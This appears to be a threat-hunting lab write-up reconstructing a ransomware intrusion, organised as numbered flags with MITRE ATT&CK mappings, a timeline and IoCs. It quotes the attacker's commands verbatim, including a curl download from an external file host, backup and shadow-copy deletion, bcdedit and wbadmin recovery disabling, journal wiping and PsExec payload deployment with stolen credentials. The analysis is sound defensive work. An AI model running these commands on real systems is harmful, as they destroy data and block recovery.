# dead-in-the-water-incident-report
# Executive Summary


In late November 2025, Azuki Corp suffered a catastrophic ransomware attack that destroyed all on-premises backups and encrypted multiple production servers, leaving the company “dead in the water” without easy recovery options. The attacker initially compromised a high-privilege admin workstation and used those credentials to pivot into the organization’s centralized backup server. Over the course of a week, the intruder conducted extensive reconnaissance on backup data and credentials, then on November 25, 2025, executed a coordinated attack to wipe out backup files and disable backup services. Immediately after crippling the backups, the attacker deployed ransomware (identified by the binary name silentlynx.exe) to critical Windows servers via lateral movement tools, resulting in widespread file encryption across the network. The ransomware left behind a ransom note named SILENTLYNX_README.txt demanding payment. Azuki Corp was left with no functioning backups, severely impacting operations.

This report provides a detailed analysis of the incident, including the attacker’s tactics and chronology, indicators of compromise (IoCs), the investigation queries used and mappings to the MITRE ATT&CK framework. 26 distinct findings (“flags”) were identified, covering actions from initial lateral movement into the backup server through ransomware execution and anti-forensic measures. Key findings include the misuse of valid admin credentials, usage of built-in tools (SSH, PsExec, etc.) for lateral movement, deletion of all backup datasets, disabling of Windows recovery features (shadow copies, backup catalogs, system restore), establishment of persistence mechanisms and deliberate destruction of forensic evidence. The timeline below reconstructs the attack sequence and the IoC section lists specific artifacts (accounts, IPs, file names, etc.) related to this breach. Finally, we outline lessons learned and recommendations to prevent such attacks, including stronger credential hygiene, network segmentation (especially for backup infrastructure), better monitoring of admin tool usage, and maintaining offline/immutable backups.

### **Background, Objective, and Scope**

**Background:** Azuki Corp’s IT environment included a dedicated Linux backup server (azuki-backupsrv) responsible for storing file server, workstation, and database backups. On November 25, 2025, Azuki Corp was hit by a ransomware attack that coincided with a complete loss of its backup repositories. The incident has been code-named “Dead in the Water” due to the organization having no viable backups after the attack. The adversary’s strategy was to first compromise and destroy the backup infrastructure to remove any recovery capability, and then deploy ransomware on primary systems to maximize pressure on the company to pay the ransom.

**Objective:** This report aims to document the incident in depth, including how the attacker breached the systems, what actions they took (with supporting evidence), and how those actions map to known tactics and techniques. It also aims to answer pressing questions such as “How did the attacker get in?”, “What did they do to the backups?”, and “How was the ransomware deployed?”. The ultimate goal is to provide actionable insights to prevent future incidents and improve incident response.

**Scope:** The investigation covered logs and telemetry from Microsoft Defender for Endpoint (MDE) across both Linux and Windows systems. We focused on the compromised admin workstation (azuki-adminpc), the Linux backup server, and several Windows servers that were laterally targeted (likely including file servers and other critical hosts). We analyzed process execution events, login records, and system events from November 18–25, 2025. All relevant attacker activities (26 flags in total) were identified and validated via Kusto Query Language (KQL) searches in the Azure cloud monitoring platform. This report does not deeply explore the initial compromise vector of the admin PC (which remains unconfirmed), but concentrates on the attacker’s actions once inside the network (lateral movement through impact).

# Key Findings and MITRE ATT&CK Mapping

The incident has been broken down into six phases aligned with the attacker’s progress. Each key finding (flag 1–26) is listed below with its description and corresponding MITRE ATT&CK technique. Together, they illustrate the full attack chain from infiltration to ransomware execution.

### Phase 1 – Linux Backup Server Compromise (Flags 1–12)

**Flag 1** – Lateral Movement (Remote Access) – The attacker pivoted from the initially compromised Windows host to the Linux backup server via SSH. Specifically, the admin workstation executed an SSH command to the backup server using a stolen privileged account
. Figure: Device process log from azuki-adminpc showing the attacker running “ssh.exe backup-admin@10.1.0.189” to remotely log in to the backup server. This use of a legitimate tool (OpenSSH client) and valid credentials is mapped to MITRE T1021.004 (Remote Services – SSH).

**Flag 2** – Lateral Movement (Attack Source) – Telemetry confirms the source of the backup server login was the internal IP 10.1.0.108, which is the compromised admin PC. The backup server’s logon records show a network logon from 10.1.0.108 on Nov 25, 2025 at 05:39:22 UTC
. Figure: Logon event on the backup server indicating a successful network login from 10.1.0.108 (internal source) via SSH. This corroborates the attacker’s path: they were already inside the network on the admin PC and moved laterally from there (T1021.004).

**Flag 3** – Credential Access (Compromised Account) – The account used to access the backup server was the backup-admin user (a privileged backup service account). The DeviceLogonEvent shows a LogonSuccess for user backup-admin on the backup server at the time of the SSH connection. This indicates the attacker had obtained valid credentials for a high-privilege account. Using a legitimate domain/administrator account to gain access corresponds to MITRE T1078.002 (Valid Accounts – Domain Account). Gaining control of “backup-admin” gave the adversary full access to backup contents without needing to exploit vulnerabilities.

**Flag 4** – Discovery (Directory Enumeration) – Shortly after SSH access, the attacker ran a directory listing command on the backup server to see what backup data was stored. They executed ls --color=auto -lh /backups/ to list the contents of the /backups directory (in long form) which is the root of all backups. This revealed multiple subdirectories such as /backups/azuki-fileserver/, /backups/azuki-adminpc/, /backups/azuki-logisticspc/, as well as directories for databases, configs, daily/weekly/monthly backups, etc. Enumerating the file system in this manner is categorized as MITRE T1083 (File and Directory Discovery). The attacker was mapping out all available backup sets for later destruction.

**Flag 5** – Discovery (File Search) – The attacker searched within the backup directories for backup archive files. They executed find /backups -name *.tar.gz, looking for tarball archives (and likely other compressed backups)
. Figure: Process event on the backup server showing the attacker running a find command to locate any “.tar.gz” files in /backups (common compressed backup files). The command curl -L -o destroy.7z ... visible above is related to tool download (Flag 8).* This action further demonstrates T1083 (File Discovery) – the attacker was identifying specific backup files (e.g., tarballs, zips, etc.) to target. In fact, the attacker’s subsequent commands (captured in logs) show they extended this search to *.tar, *.zip, *.bak files and then prepared to delete them.

**Flag 6** – Discovery (Account Enumeration) – On the backup server, the attacker enumerated local user accounts by reading the system password file: cat /etc/passwd. This command’s execution was logged on Nov 24, 2025 at 14:16:08 UTC (shortly after other discovery commands). Listing /etc/passwd reveals all user account names on the Linux system. The likely goal was to discover if there were other privileged accounts or to find reuse of credentials. This behavior aligns with MITRE T1087.001 (Account Discovery – Local Accounts). It shows the attacker gathering information for potential privilege escalation or further lateral movement (though in this case, they already had a high-privilege account on this server).

**Flag 7** – Discovery (Scheduled Job Reconnaissance) – The attacker checked for scheduled backup jobs on the server, likely to understand backup routines and possibly to disable them. They viewed the system crontab by running cat /etc/crontab, and also ran crontab -l for the backup-admin user. This revealed cron scheduled tasks (e.g. any regular backup scripts). Knowing the backup schedule could help time their destructive actions for maximum impact (for instance, just after a backup cycle to ensure data is as up-to-date as possible before deletion). This is another form of T1083 (File/Directory Discovery), specifically targeting configuration files (cron schedules) that indicate automated tasks.

**Flag 8** – Command & Control (Tool Transfer) – The attacker downloaded a malicious tool or script onto the backup server from an external source. They executed curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z 
. Figure: Process log on backup server showing the curl command fetching destroy.7z from litter.catbox.moe and saving it locally. The URL litter.catbox.moe is an anonymous file-sharing site, suggesting the attacker hosted their tool there. The file name “destroy.7z” implies it might contain scripts to destroy data or escalate privileges. This action is classified as MITRE T1105 (Ingress Tool Transfer) – pulling down hacking tools or malware from an external server into the victim environment. (Notably, the process metadata shows this curl was invoked by a PowerShell process on the Windows side, indicating the attacker may have launched it remotely or via an automated script.)

**Flag 9** – Credential Access (Credentials in Files) – On Nov 24, 2025, the attacker accessed a file containing stored credentials: cat /backups/configs/all-credentials.txt. This file presumably contained plaintext credentials (passwords, keys, or tokens) for various systems – a goldmine for the attacker
. The presence of an “all-credentials.txt” file in backups is a serious security lapse. The attacker’s access to it (via a simple cat command) would have revealed any admin passwords or keys stored there. Indeed, from subsequent activity we infer they obtained at least two domain credentials (for users yuki.tanaka and kenji.sato) likely from this file. Exploiting sensitive information in configuration or backup files corresponds to MITRE T1552.001 (Unsecured Credentials – Credentials in Files). This allowed the attacker to expand their control to Windows domain resources without cracking any hashes or deploying credential dumping malware – they simply read the passwords in a text file.

**Flag 10** – Impact (Data Destruction) – After completing reconnaissance and presumably escalating privileges to root on the backup server, the attacker destroyed all backup data. They issued a recursive delete command: rm -rf /backups/archives /backups/azuki-adminpc /backups/azuki-fileserver /backups/azuki-logisticspc /backups/config-backups /backups/configs /backups/daily /backups/database-backups /backups/databases /backups/fileserver /backups/logs /backups/monthly /backups/weekly /backups/workstations (all in one line) at approximately 05:47:02 UTC on Nov 25. 
Figure: Forensic log showing the attacker (as root) executing rm -rf /backups/... on the backup server. Multiple backup directories (archives, adminpc, fileserver, etc.) were specified, deleting all contents. This single command (and a couple of follow-up rm -rf commands for any remaining backup paths) wiped out every backup repository – from file server backups to workstation backups, databases, and even backup logs. This activity falls under MITRE T1485 (Data Destruction). It answers the crucial question: the attackers deleted every stored backup and archive, ensuring Azuki Corp had no data to restore after the ransomware attack. (In effect, the organization’s “last line of defense” was gone in seconds.)

**Flag 11** – Impact (Service Stop) – To further cement the damage on the backup server, the attacker stopped the backup scheduling service (cron). They ran systemctl stop cron, immediately halting the cron daemon. Cron is responsible for running scheduled jobs (like nightly backup scripts); stopping it could prevent any last-minute backup or maintenance jobs from running. This change took effect at 05:47:03 UTC, essentially concurrent with the file deletions. Stopping a critical service is categorized as MITRE T1489 (Service Stop). At this point, backup operations were not only destroyed on disk but also halted in memory.

**Flag 12** – Impact (Service Disabled) – The attacker then disabled the cron service permanently by executing systemctl disable cron. This ensures that even if the backup server is restarted, the cron service will not auto-start. In other words, no new backup tasks would run moving forward. This “survives reboot” change is also part of T1489 (Service Stop), demonstrating the attacker’s thoroughness in preventing future backups. Flags 11 and 12 together mean the backup server’s functionality was completely neutralized: data gone and scheduling mechanism inert.

By the end of Phase 1, the attacker had fully compromised the Linux backup server and wiped all backup data. They also collected credentials that would soon be used to compromise the Windows environment. The attack now shifted to actively deploying ransomware on primary systems, knowing that the safety net of backups was removed.

### Phase 2 – Windows Ransomware Deployment (Flags 13–15)

**Flag 13** – Lateral Movement (Remote Execution) – The attacker next turned to the Windows domain, using credentials (exposed in Flag 9) to spread ransomware. They employed the Sysinternals PsExec utility (64-bit) to execute commands on multiple Windows servers remotely. PsExec works over SMB (Windows Admin$ shares) and enables running processes as NT AUTHORITY\SYSTEM on target hosts. The logs show the attacker, from azuki-adminpc (the admin workstation), launching PsExec64.exe with the -accepteula flag and targeting at least three internal hosts (IPs 10.1.0.102, 10.1.0.188, 10.1.0.204)
. Figure: Timeline of malicious taskkill commands on azuki-adminpc by user yuki.tanaka. The presence of many taskkill /F entries (5:31 and 6:04 AM) indicates the attacker was running administrative commands on multiple machines. These would have been executed via PsExec or a similar remote admin method. The use of a domain admin account (yuki.tanaka) on azuki-adminpc is a strong indication that PsExec or SMB admin shares were used to propagate. Using PsExec to pivot across Windows systems corresponds to MITRE T1021.002 (Remote Services – SMB/Windows Admin Shares). This technique allowed the attacker to push the ransomware binary to multiple servers simultaneously for widespread impact.

**Flag 14** – Lateral Movement (Deployment Command) – The full command used by the attacker (captured from PsExec arguments) was:

PsExec64.exe \\10.1.0.102 -u kenji.sato -p <redacted> -c -f C:\Windows\Temp\cache\silentlynx.exe


This reveals several details:

They targeted the host at 10.1.0.102 (likely one of Azuki’s file or application servers).

They used credentials for user kenji.sato (-u kenji.sato -p <password>), which suggests kenji.sato is an administrative user on that host or domain. (It appears the attacker had Kenji’s password, possibly obtained from the credentials file on the backup server.)

The -c -f options in PsExec mean “copy the specified file to the remote system and force overwrite if it already exists”. The file copied/executed was C:\Windows\Temp\cache\silentlynx.exe.

In summary, the attacker manually or programmatically ran PsExec for each target server, supplying stolen credentials and uploading the ransomware binary. This single command includes both the lateral movement and the remote execution of the payload. It’s a prime example of living-off-the-land: using an admin tool (PsExec) and valid creds to deploy malware without dropping a specialized exploit. (MITRE techniques: still T1021.002 for the SMB aspect; the execution of the binary on the remote host can be considered T1569.002 (Service Execution), since PsExec creates a temporary service on the remote machine to launch the process.)

**Flag 15** – Execution (Malicious Payload) – The malware deployed on the targets was the ransomware silentlynx.exe. This executable was written into the Windows Temp directory (under a folder named “cache”) on each victim host and then launched via the PsExec service. Once running, “silentlynx” ransomware began encrypting files on the infected servers. The presence of this filename in multiple systems is a strong indicator of the ransomware family or campaign. Identifying the payload is important for threat hunting across other systems (to ensure it did not spread further) and for potential vaccine/mitigation steps. In this case, “silentlynx.exe” appears to be a custom or lesser-known ransomware variant. This finding aligns with MITRE T1486 (Data Encrypted for Impact) – the execution of ransomware that encrypts data. While the actual encryption activity is not a single logged command, the running of this payload is the trigger for file encryption on the targets.

By the end of Phase 2, the attacker had delivered and started the ransomware on three key servers. The use of two sets of stolen credentials is notable: yuki.tanaka (seen executing PsExec and subsequent commands on the admin PC) and kenji.sato (used for authentication to at least one target server via PsExec). Both accounts were likely high-privilege domain users, underscoring how compromised credentials accelerated the attack. The attacker did not need to exploit any Windows vulnerabilities or drop additional backdoors at this point – they leveraged existing admin capabilities to propagate the ransomware.

### Phase 3 – Recovery Inhibition (Flags 16–22)

Once the ransomware was deployed, the attacker (or automated ransomware routines) took a series of steps on each infected Windows host to inhibit any system recovery or file restoration mechanisms. These steps are characteristic of sophisticated ransomware operations, which aim to leave victims with no choice but to pay the ransom.

**Flag 16** – Impact (Shadow Copy Service Stopped) – The Volume Shadow Copy Service (VSS) was stopped on each targeted Windows machine. The attacker executed net stop VSS /y, which gracefully stops the Volume Shadow Copy service and also confirms stopping any dependent services with the /y flag. VSS is responsible for creating Volume Shadow Copies (a form of restore point that allows reverting files or the system to previous states). By stopping VSS, the attacker ensures no further shadow copies will be made during the encryption process. This is an immediate availability impact on backup/restore capabilities (classified under MITRE T1489 – Service Stop). “Shadow service stopped” prevents any on-the-fly backups; it was the first step in cutting off the victims’ self-recovery options.

**Flag 17** – Impact (Backup Engine Stopped) – The Windows Backup Engine service (wbengine) was also stopped via net stop wbengine /y. This service is used by Windows Backup to schedule and run backups; if Azuki had any Windows Server Backup tasks on those servers, they would now be halted. Even if not in use, stopping wbengine ensures that no server-level backup jobs (like system state backups) could run. This further enforces MITRE T1489 (Service Stop) and complements the actions in Flag 16. In effect, the attacker issued commands to stop both VSS and Windows Backup on the infected hosts, ensuring that neither file-level nor system-level backups could occur during or after the ransomware execution.

**Flag 18** – Defense Evasion (Process Termination) – The attacker (or ransomware script) terminated various processes to unlock files and disable security before encryption. For example, they ran taskkill /F /IM sqlservr.exe to force-stop Microsoft SQL Server processes on the machine
. Figure: Process audit log showing a series of taskkill /F commands executed by user yuki.tanaka on azuki-adminpc (likely via remote commands to other servers). The list includes kills for MsMpEng.exe (Windows Defender Antivirus), MpCmdRun.exe, NisSrv.exe (Network Inspection Service), as well as database services like sqlservr.exe, mysql.exe, oracle.exe, postgres.exe, and others. This shows the attacker systematically killed security software (Windows Defender) and database or enterprise applications that keep files open (SQL, MySQL, Oracle, Exchange, etc.), as well as office applications (Outlook, Excel, Word as seen at 6:04:58). By doing so, they achieved two goals:

Defense Evasion – terminating antivirus (Defender) processes (T1562.001 – Disable or Modify Tools) to avoid the ransomware being blocked or quarantined.

Prepare for Encryption – terminating database and document processes so that their data files are closed and can be encrypted. Many ransomware strains include this step to maximize file coverage.

This behavior is broadly categorized under MITRE T1489 (Inhibit System Recovery/Service Stop) for the services and could also be considered T1486 (Data Encrypted for Impact) enabling actions. The key point is the attacker left no stone unturned – even actively running databases and security tools were shut down to ensure the ransomware could encrypt everything on disk without interference.

**Flag 19** – Impact (Recovery Point Deletion) – The attacker deleted all existing volume shadow copies on the Windows hosts. They executed vssadmin delete shadows /all /quiet, which permanently removes all Volume Shadow Copy snapshots on the system (across all drives, /all) and does so quietly without prompt (/quiet). Volume Shadow Copies are essentially “recovery points” that allow restoration of previous file versions. By deleting them, the attacker ensured that even if Azuki’s IT attempted to use “Previous Versions” or restore points after discovering encryption, there would be none available. This is a direct hit on system recovery, mapped to MITRE T1490 (Inhibit System Recovery). Effect: Victims cannot roll back files or the system state to before encryption – one more leverage for the attackers.

**Flag 20** – Impact (Storage Space Limitation) – Next, the attacker ran vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB on the infected machines. This command shrinks the allocated storage space for shadow copies on the C: drive to a ridiculously small size (401 MB). The effect of this is twofold: it purges existing shadow copies (because the previously used shadow storage likely exceeded this new tiny limit, causing older copies to be deleted to free space), and it prevents new shadow copies from being created (since 401 MB is often too low for even one snapshot, and it’s an odd number clearly not a standard configuration). This is a clever anti-recovery trick that some ransomware use to complement the outright deletion in Flag 19. It falls under the same tactic, T1490 (Inhibit System Recovery), by ensuring the shadow copy feature can’t be easily used even if an admin attempted to re-enable it. Essentially, the attacker not only deleted current restore points but also crippled the system’s ability to create new ones.

**Flag 21** – Impact (System Recovery Disabled) – The attacker disabled the Windows Recovery environment and system restore features by modifying boot configuration. They executed bcdedit /set {default} recoveryenabled No on the affected systems. This command tells Windows Boot Manager that the default OS entry should not have recovery enabled. In practice, it means that if the system crashes or is manually rebooted into recovery mode, the usual recovery options (like System Restore or Startup Repair) will be unavailable. It also often disables the automatic creation of restore points. This step is another aspect of T1490 (Inhibit System Recovery). The attacker was ensuring that even Windows built-in recovery console or restore options were turned off, leaving no avenue for easy restoration. It’s an uncommon but damaging step – essentially cutting off the “last resort” recovery on the machine itself.

**Flag 22** – Impact (Backup Catalog Deletion) – Finally, the attacker deleted the Windows Backup catalog on each system using wbadmin delete catalog -quiet. The backup catalog is a record of backups (created by the Windows Server Backup feature) that may reside on the system – including information of what backups exist and where. By deleting it, the attacker prevents the admins from easily locating or restoring any backups that might have been made to external drives or network locations using the Windows Backup utility. In Azuki’s case, it’s unclear if Windows Server Backup was used on those machines, but the attacker issued the command regardless (perhaps as part of an automated script). This action is yet another Inhibit System Recovery (T1490) technique, covering the possibility that local or network backups might be listed on the system. After this, even if Azuki had any backups made with Windows Backup, the servers “believed” there were none (the catalog was gone). Essentially, every possible method of recovery – VSS, System Restore, Backup catalog – was methodically destroyed or disabled.

By the end of Phase 3, the attacker had obliterated the victim’s ability to recover data without external help. At this stage, the backup server was gone (Phase 1) and each individual server’s on-box recovery mechanisms were also wiped (Phase 3). The ransomware was free to proceed to completion.

### Phase 4 – Persistence (Flags 23–24)

During or after the ransomware deployment, the attacker also established persistence mechanisms on the network – likely as a fallback in case some systems were not immediately encrypted or if they planned to maintain access post-ransomware (for example, to monitor payment or execute additional actions). Two persistence techniques were observed:

**Flag 23** – Persistence (Registry Autorun) – The attacker created a new autorun registry entry named “WindowsSecurityHealth”. This was likely added to a Run key, for example: HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityHealth. The value would cause a program (potentially the ransomware or a backdoor) to execute every time a user logs in or the system starts. The choice of the name WindowsSecurityHealth is deceptive – it mimics legitimate Windows Security Center/Health Service naming, in hopes of not raising suspicion. This corresponds to MITRE T1547.001 (Boot or Logon Autostart – Registry Run Keys). In context, it means that even if a machine rebooted (or if the ransomware process was terminated), the attacker’s malware could persist and restart automatically via this registry key.

**Flag 24** – Persistence (Scheduled Task) – The attacker also registered a Scheduled Task on infected machines, named “SecurityHealthService” under the Windows Task Scheduler library (in Microsoft\Windows\Security\). This task was configured to run their payload on a schedule or at system startup. Using Task Scheduler provides another way to achieve persistence with fine-grained control (e.g., run at specific times or triggers). The name SecurityHealthService again impersonates a legitimate Windows service (Windows Security Health Service) to hide in plain sight. This aligns with MITRE T1053.005 (Scheduled Task/Job – Scheduled Task). By having both a registry autorun and a scheduled task, the attacker implemented redundant persistence – ensuring their malware would relaunch even if one mechanism was found and removed. (It’s worth noting that by the time the ransom note is displayed, persistence is less about stealth and more about ensuring any system reboots don’t undo the encryption or that the attackers maintain access for negotiations.)

These persistence mechanisms suggest the attacker was prepared to linger in the environment or potentially re-use the compromised machines beyond the immediate ransomware event. It also indicates a level of complexity beyond a simple smash-and-grab ransomware; they took steps typical of APT actors or those who might come back to install data exfiltration tools or monitors.

### Phase 5 – Anti-Forensics (Flag 25)

**Flag 25** – Defense Evasion (Artifact Cleanup) – After encryption, the attacker executed fsutil.exe usn deletejournal /D C: on the Windows hosts. This command deletes the NTFS USN Change Journal on the C: drive. The USN journal is a system file that records all changes to files on the volume (it’s used by Windows for various purposes, like backup and search indexing). By deleting it (/D for delete, /N for disabling journal – though in this command they used the syntax without /N which defaults to delete), the attacker effectively wiped a forensic record of file operations on that volume
. In the earlier figure showing taskkill events, note that multiple processes were killed around 6:04:57. It is likely that the fsutil command was issued around 6:05 AM following those, though it isn’t explicitly listed there. This step is a classic anti-forensic technique categorized as MITRE T1070.004 (File System Artifact Removal). The rationale is that, after encryption, investigators cannot retrieve the change journal to see which files were modified or created (which would have shown a list of every file encrypted and the creation of ransom note files, etc.). It also hinders certain file recovery techniques that rely on the journal. In essence, the attackers tried to cover their tracks on the file system, making it harder to analyze the scope of what was encrypted or to recover files via journal replay.

By doing this, the attacker demonstrated a high level of sophistication – not only did they accomplish their goal of encryption and data destruction, they also took steps to frustrate incident response and recovery. At this point, the attack had reached its objective: the victims’ critical data was encrypted, backups were destroyed, and forensic evidence was partially wiped. The stage was set for the ransom demand.

### Phase 6 – Ransomware Success (Flag 26)

**Flag 26** – Impact (Ransom Note) – The final outcome of the attack was the creation of ransom note files on the infected systems. The ransom note observed in this incident was named SILENTLYNX_README.txt. Multiple copies of this note were likely dropped in various directories (e.g., on the desktop or in each folder containing encrypted files). The note contains the attackers’ message: typically instructions on how to pay the ransom, contact information, and threats or unique identifiers for the victim. The presence of SILENTLYNX_README.txt confirms that the “Silentlynx” ransomware fully executed and completed encryption on the systems. This corresponds to the tail end of MITRE T1486 (Data Encrypted for Impact) – the ransom note is the indicator of successful encryption and impact.

At this stage, Azuki Corp’s servers were locked down by encryption, and with backups eliminated, the company faced the grim prospect of either paying the ransom or attempting to rebuild systems and data from scratch. The attack effectively achieved its purpose, leaving the company’s IT infrastructure in a state where it could not function or be restored without the attacker’s decryption keys.

# Timeline of Attacker Activity

Below is a reconstructed chronological timeline of the attacker’s key actions, pieced together from log timestamps and event data. All times are in UTC (as recorded in logs).

Prior to Nov 18, 2025 – Initial Compromise: The attacker gains access to Azuki’s internal network, likely by compromising the azuki-adminpc workstation (e.g., via phishing or an exploit). By the time of the first logged actions on Nov 18, the attacker had control of the credentials for the backup-admin account (or possibly the machine itself which had saved credentials). (Initial access details are not fully captured in available logs, but evidence suggests the admin PC of user Yuki Tanaka was breached and served as the launching point.)

Nov 18, 2025 10:24:58 AM – Lateral Movement to Backup (Phase 1 start): The attacker uses the backup-admin credentials to log into azuki-backupsrv (Linux backup server) via SSH from the admin PC. The first recorded command on the backup server is ls -lh /backups/, indicating the attacker’s attempt to view backup contents.

Nov 18–23, 2025 – Stealthy Access: The attacker maintains low-key access to the backup server. It’s likely they periodically checked data or prepared scripts. (There’s a gap in observed commands between Nov 18 and Nov 24, which might indicate the attacker laying low or exfiltrating some data. It could also be that not all their activities were logged or detected.)

Nov 24, 2025 2:14–2:16 PM – Backup Server Recon: A burst of discovery activity occurs on the backup server:

2:14:14 PM – The attacker reads /backups/configs/all-credentials.txt and possibly other config files, harvesting cleartext credentials.

2:16:06 PM – Runs find /backups -name *.tar.gz to locate backup archives.

2:16:08 PM – Runs cat /etc/passwd (enumerate users) and cat /etc/crontab (check scheduled jobs).
These actions show the attacker gathering information on backup files and schedules, and likely extracting passwords (including those of domain admins).

Nov 24, 2025 (evening) – Using the stolen credentials from the backup server, the attacker prepares for the next phase. For example, if kenji.sato’s password was obtained, they now have domain admin access. No disruptive actions are taken yet – the attacker waits until they are ready to execute the final kill-chain, likely timing it for the next day in the early morning when IT staff are minimal.

Nov 25, 2025 5:31:11 AM – Disabling Defenses: On the compromised admin PC, the attacker (as yuki.tanaka) executes a series of taskkill commands targeting security processes. Windows Defender Antivirus (MsMpEng.exe) and related services are terminated. This indicates the attacker is preparing for overt actions by first ensuring the endpoint security on this PC (and possibly others via domain policy) won’t interfere. It’s a prelude to deploying ransomware without being detected.

Nov 25, 2025 5:39:10 AM – Active Attack Begins: From azuki-adminpc, the attacker launches SSH to the backup server using backup-admin (the command ssh.exe backup-admin@10.1.0.189 is executed)
. Within a few seconds (by 5:39:22), the backup server registers a successful network logon from the admin PC
. The attacker likely uses an automated script or prepared commands at this point.

Nov 25, 2025 5:45:34 AM – On the backup server, the attacker downloads the “destroy.7z” tool from their external source via curl
. They might use this tool to expedite file deletion or attempt privilege escalation to root (if not already root). However, logs suggest by 5:47 they were executing commands as root, implying they achieved root privileges (possibly the backup-admin account was in sudoers or the credentials file yielded the root password).

Nov 25, 2025 5:47:02 AM – Backup Destruction: The attacker executes the rm -rf /backups/... command as root on the backup server, simultaneously deleting all backup directories and files
. Within the same minute, follow-up delete commands (e.g., targeting any remaining backup config files or database backups) are run. At 5:47:02–5:47:03 AM, Azuki’s entire backup repository is destroyed.

Nov 25, 2025 5:47:03 AM – Immediately after deletion, the attacker runs systemctl stop cron and systemctl disable cron on the backup server, stopping any scheduled tasks and preventing future backup jobs from running.

Nov 25, 2025 ~5:48 AM – Pivot to Windows: With backups neutralized, the attacker shifts to deploying ransomware on Windows servers. Using the previously stolen domain credentials, they initiate PsExec sessions from the admin PC to multiple servers:

They connect to host 10.1.0.102 as user kenji.sato (and likely similarly to .188 and .204, possibly representing file server, application server, and a database server).

The ransomware binary silentlynx.exe is copied to C:\Windows\Temp\cache\ on each host and executed via PsExec service.

This likely occurs around 5:48–5:50 AM, as it’s just after the backup server actions. (The exact timestamps for PsExec aren’t directly logged, but the subsequent events on the target machines begin at 5:51 AM, indicating deployment just prior.)

Nov 25, 2025 5:50–5:51 AM – Ransomware Execution: The silentlynx.exe ransomware processes start on the target servers, encrypting files. Around this time, the first signs of encryption (such as high disk activity, file extensions changing, etc.) would occur, though these specifics might not be captured in our logs. The attacker’s script concurrently issues a series of commands on each machine to disable recovery:

5:50–5:51 AM: net stop VSS /y and net stop wbengine /y are executed on each target (stopping Volume Shadow Copy and Backup services).

5:51 AM: vssadmin delete shadows /all /quiet runs, purging all restore points.

5:51 AM: vssadmin resize shadowstorage ... 401MB runs, limiting shadow copy storage (ensuring none remain or can be made).

5:52 AM: bcdedit /set {default} recoveryenabled No executes, disabling Windows recovery boot.

5:52 AM: wbadmin delete catalog -quiet executes, deleting backup catalog records.

These commands occur in rapid succession (within a minute or two) across the compromised servers, either orchestrated by the ransomware itself or a script launched via PsExec.

Nov 25, 2025 5:53 AM – File Encryption Completes: Around this time, the ransomware likely finishes encrypting the bulk of the data on each server. The malware then drops the ransom note SILENTLYNX_README.txt in various locations. Users or administrators would begin noticing encrypted files (possibly with a new file extension or changed icons) and the ransom note text files appearing.

Nov 25, 2025 5:54 AM – Persistence Measures: The attacker (possibly as part of the ransomware routine) creates the registry Run key “WindowsSecurityHealth” and the scheduled task “SecurityHealthService” on the infected machines. These are timestamped roughly at the end of the malware execution (exact log times not captured, but it would be immediately after encryption, so approximately 5:54–5:55 AM). These ensure that if a system reboots, the ransomware (or any related malware) would run again.

Nov 25, 2025 5:55 AM – Cleanup: The attacker issues fsutil usn deletejournal /D C: on each server’s C: drive to wipe the NTFS change journal. This is likely one of the last commands executed, as the attacker is covering tracks after the payload has run. Log entries indicate multiple processes were killed up to 5:54 AM; the journal deletion would come just after that. By 5:55 AM, this anti-forensic step is completed.

Nov 25, 2025 6:00 AM – Attacker Disconnects: Having executed the ransomware and cleanup, the attacker likely logs off and removes any interactive access. (The SSH session to the backup server might be closed around this time, and no further PsExec commands are issued from the admin PC.) The attackers now wait for Azuki Corp to discover the ransom note and initiate contact.

Nov 25, 2025 6:04 AM – Residual Commands: A few straggling taskkill commands are observed at 6:04 AM from the admin PC (yuki.tanaka) targeting various processes (Outlook, Excel, etc.)
. These may indicate the ransomware was still finishing up encryption on open files and ensuring they could be encrypted by terminating those applications. It’s also possible these were automated as part of the malware’s process-killing routine. By 6:05 AM, all malicious activity had ceased.

Nov 25, 2025 ~8:00 AM – Incident Discovered: Azuki Corp’s IT team likely began noticing system issues at start of business. Users couldn’t access file servers or databases. The ransom notes SILENTLYNX_README.txt were found, after which the incident response process was initiated. By then, however, the damage was done: all recent backups were gone and primary data encrypted.

This timeline highlights the speed and precision of the attack on November 25. In the span of roughly 20 minutes (5:39–5:59 AM), the attacker pivoted to the backup server, destroyed data, then pivoted to multiple servers and deployed ransomware, leaving no recovery option. The preparation the day before (and possibly earlier) enabled this swift execution. The coordination of disabling security, deleting backups, and starting encryption nearly simultaneously shows it was a scripted, pre-planned playbook rather than a random hack.

# Indicators of Compromise (IoCs)

Several IoCs were identified during the investigation. These can be used to detect any remaining footholds or similar attacks in the future:

### Compromised User Accounts:

backup-admin – Linux backup server account used by attacker via SSH.

yuki.tanaka – Domain user (with admin privileges) whose credentials were used on azuki-adminpc to run lateral movement and ransomware commands.

kenji.sato – Domain user (admin) credentials used for PsExec login to at least one server (10.1.0.102).
(If these accounts are not intended for such uses, their use in these contexts is a clear sign of compromise.)

### Internal IP Addresses:

10.1.0.108 – Source of the attack within the network (Azuki Admin PC). Any traffic or logins from this host to servers at unusual times is suspect.

10.1.0.189 – Linux backup server that was compromised (target of SSH from 10.1.0.108).

10.1.0.102, 10.1.0.188, 10.1.0.204 – Windows servers that were targeted for ransomware deployment via PsExec. (Exact hostnames: likely Azuki file server, logistics server, and possibly an application or database server corresponding to those backup sets.)

### External IP/Domain:

litter.catbox.moe – External file hosting domain used to download the attacker’s tool (destroy.7z). This domain in corporate traffic is highly unusual. Any DNS queries or HTTP/S connections to litter.catbox.moe should be treated as suspicious. (The specific URL path was https://litter.catbox.moe/io523y.7z – the presence of io523y.7z in web proxy logs would be an IoC of this attack.)

### Malicious Files:

destroy.7z – 7-zip archive downloaded to the backup server. (Hash MD5: 81756ec4f1cd13bfa20105e9d1b3791b as captured in telemetry.) This file likely contained scripts or binaries for destruction or privilege escalation on Linux. The presence of this file on any system is an IoC.

silentlynx.exe – Ransomware payload deployed on Windows systems. It was stored in C:\Windows\Temp\cache\silentlynx.exe during execution. Any detection of this file name or an unknown binary with that name (and its hash, if available) is a strong indicator of this attack. (Its exact hash wasn’t fully captured in logs, but it should be treated as malicious by name alone, as “silentlynx” is not a standard Windows component.)

SILENTLYNX_README.txt – Ransom note text file. Finding this file on any system means that system was hit by the ransomware. The contents typically include ransom payment instructions and possibly a unique victim ID or contact. IoC wise, security teams can search for this filename across endpoints.

